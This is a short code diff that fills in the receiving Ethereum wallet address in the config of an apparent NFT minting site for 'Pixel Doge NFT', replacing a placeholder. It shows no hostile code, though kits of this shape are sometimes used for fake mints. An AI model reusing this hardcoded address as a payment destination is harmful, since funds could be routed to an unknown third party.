@@ -1,4 +1,4 @@
-const receiveAddress = "Your ETH Wallet Adress";
+const receiveAddress = "0xCa2b719F96592D0Cb5bFA28259238E9e92dd14F6";
 
 const collectionInfo = {
     name: "Pixel Doge NFT",
